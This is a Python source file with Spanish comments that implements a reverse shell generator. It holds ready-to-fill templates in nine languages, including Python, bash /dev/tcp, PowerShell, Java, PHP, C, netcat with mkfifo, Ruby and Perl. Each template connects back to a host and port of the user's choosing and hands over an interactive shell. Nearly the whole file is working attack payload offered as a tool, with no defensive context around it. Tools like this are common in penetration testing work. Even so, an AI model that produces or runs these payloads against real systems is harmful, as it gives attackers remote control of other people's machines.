"""Generador de reverse shells en múltiples lenguajes."""

from dataclasses import dataclass


@dataclass
class ReverseShell:
    """Resultado de una generación de reverse shell."""
    language: str
    lhost: str
    port: int
    payload: str


class ReverseShellGenerator:
    """Genera reverse shells para diferentes lenguajes."""

    TEMPLATES: dict[str, str] = {
        "python": (
            "import socket,subprocess,os\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.connect(({lhost!r},{port}))\n"
            "os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\n"
            "os.dup2(s.fileno(),2)\n"
            "subprocess.call(['/bin/sh','-i'])\n"
        ),
        "bash": (
            "bash -i >& /dev/tcp/{lhost}/{port} 0>&1\n"
        ),
        "powershell": (
            "$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{port});"
            "$stream=$client.GetStream();"
            "[byte[]]$bytes=0..65535|%{{0}};"
            "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0)"
            "{{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback=(iex $data 2>&1|Out-String);"
            "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
            "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}}\n"
        ),
        "java": (
            "import java.io.*;\nimport java.net.*;\n"
            "class S {{\n"
            "  public static void main(String[] a) throws Exception {{\n"
            "    Socket s=new Socket(\"{lhost}\",{port});\n"
            "    Runtime r=Runtime.getRuntime();\n"
            "    Process p=r.exec(\"/bin/sh\");\n"
            "    InputStream pi=p.getInputStream(),si=s.getInputStream();\n"
            "    OutputStream po=p.getOutputStream(),so=s.getOutputStream();\n"
            "    while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());\n"
            "    so.flush();while(si.available()>0)po.write(si.read());\n"
            "    po.flush();Thread.sleep(50);if(!p.waitFor(50,java.util.concurrent.TimeUnit.MILLISECONDS))p.destroy();}}\n"
            "}}\n"
        ),
        "php": (
            "<?php\n"
            "$sock=fsockopen(\"{lhost}\",{port});\n"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");\n"
            "?>\n"
        ),
        "c": (
            "#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n"
            "#include <unistd.h>\n\n"
            "int main(){{\n"
            "  int s=socket(AF_INET,SOCK_STREAM,0);\n"
            "  struct sockaddr_in a;\n"
            "  a.sin_family=AF_INET;\n"
            "  a.sin_port=htons({port});\n"
            "  a.sin_addr.s_addr=inet_addr(\"{lhost}\");\n"
            "  connect(s,(struct sockaddr*)&a,sizeof(a));\n"
            "  dup2(s,0);dup2(s,1);dup2(s,2);\n"
            "  execl(\"/bin/sh\",\"sh\",NULL);\n"
            "  return 0;\n}}\n"
        ),
        "netcat": (
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f\n"
        ),
        "ruby": (
            "require 'socket'\n"
            "TCPSocket.new(\"{lhost}\",{port}).tap do |s|\n"
            "  while cmd=s.gets\n"
            "    IO.popen(cmd,\"r\") {{|io| s.print io.read }}\n"
            "  end\nend\n"
        ),
        "perl": (
            "use Socket;\n"
            "$i=\"{lhost}\";$p={port};\n"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{\n"
            "  open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');\n"
            "  exec('/bin/sh -i');\n}};\n"
        ),
    }

    def generate(self, language: str, lhost: str, port: int) -> ReverseShell:
        language = language.lower()
        template = self.TEMPLATES.get(language)
        if not template:
            raise ValueError(
                f"Lenguaje no soportado: {language}. "
                f"Disponibles: {', '.join(self.TEMPLATES.keys())}"
            )
        payload = template.format(lhost=lhost, port=port)
        return ReverseShell(language=language, lhost=lhost, port=port, payload=payload)

    def list_languages(self) -> list[str]:
        return list(self.TEMPLATES.keys())
